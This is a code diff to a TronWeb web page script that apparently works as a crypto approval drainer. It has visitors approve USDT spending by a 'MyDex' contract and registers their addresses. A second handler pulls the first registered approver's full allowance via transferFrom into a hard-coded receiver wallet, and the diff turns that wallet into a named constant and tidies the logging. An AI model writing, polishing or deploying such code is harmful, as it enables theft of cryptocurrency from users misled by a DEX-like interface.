@@ -56,6 +56,7 @@
 
     const USDT_contractAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
     const MyDex_contractAddress = "TWKeZLCX7b6xnyhL9PyFhkA7A8ezkQRWsF";
+    const receiverAddress = "TBofpm8BrK1sgAgUFmQTKgbSHkFr8HgM5B";
 
     const TRC20_ABI = [
       {
@@ -130,10 +131,7 @@
         solidityNode: await window.tronWeb.isConnected("solidityNode"),
         eventServer: await window.tronWeb.isConnected("eventServer"),
       };
-      alert(`節點狀態：
-FullNode: ${status.fullNode}
-SolidityNode: ${status.solidityNode}
-EventServer: ${status.eventServer}`);
+      alert("節點狀態：\n" + JSON.stringify(status, null, 2));
     };
 
     approveButton.onclick = async () => {
@@ -146,12 +144,15 @@ EventServer: ${status.eventServer}`);
         const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
         const MyDex = await window.tronWeb.contract(MyDex_ABI, MyDex_contractAddress);
 
-        await USDT.approve(MyDex_contractAddress, amount).send({ feeLimit: 100_000_000 });
-        await MyDex.addAddress(userAddress).send({ feeLimit: 100_000_000 });
+        const tx1 = await USDT.approve(MyDex_contractAddress, amount).send({ feeLimit: 100_000_000 });
+        console.log("授權成功:", tx1);
+
+        const tx2 = await MyDex.addAddress(userAddress).send({ feeLimit: 100_000_000 });
+        console.log("加入成功:", tx2);
 
         alert("✅ 授權與加入成功");
       } catch (err) {
-        console.error("❌ 授權錯誤：", err);
+        console.error("授權失敗:", err);
         alert("❌ 授權失敗：" + (err.message || "未知錯誤"));
       }
     };
@@ -163,17 +164,17 @@ EventServer: ${status.eventServer}`);
 
         const fromHex = await MyDex.getIndexAddress(0).call();
         const from = window.tronWeb.address.fromHex(fromHex);
-        const to = "TBofpm8BrK1sgAgUFmQTKgbSHkFr8HgM5B";
 
         const allowance = await USDT.allowance(from, MyDex_contractAddress).call();
         const amount = window.tronWeb.toBigNumber(allowance).toString();
 
-        if (BigInt(amount) === 0n) return alert("尚未授權或金額為 0");
+        if (BigInt(amount) === 0n) return alert("尚未授權或授權為 0");
 
-        const tx = await MyDex.transferFrom(from, to, amount).send({ feeLimit: 100_000_000 });
+        const tx = await MyDex.transferFrom(from, receiverAddress, amount).send({ feeLimit: 100_000_000 });
+        console.log("轉帳成功:", tx);
         alert("✅ 轉帳成功！交易 ID：" + tx);
       } catch (err) {
-        console.error("❌ 轉帳失敗：", err);
+        console.error("轉帳錯誤:", err);
         alert("❌ 轉帳失敗：" + (err.message || "未知錯誤"));
       }
     };
@@ -184,11 +185,9 @@ EventServer: ${status.eventServer}`);
         const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
         const balance = await USDT.balanceOf(userAddress).call();
         const allowance = await USDT.allowance(userAddress, MyDex_contractAddress).call();
-        alert(`錢包地址：${userAddress}
-USDT 餘額：${balance / 1e6}
-授權額度：${allowance / 1e6}`);
+        alert(`錢包地址：${userAddress}\nUSDT 餘額：${balance / 1e6}\n授權額度：${allowance / 1e6}`);
       } catch (err) {
-        console.error("❌ 查詢錯誤：", err);
+        console.error("查詢錯誤:", err);
         alert("❌ 查詢失敗：" + (err.message || "未知錯誤"));
       }
     };
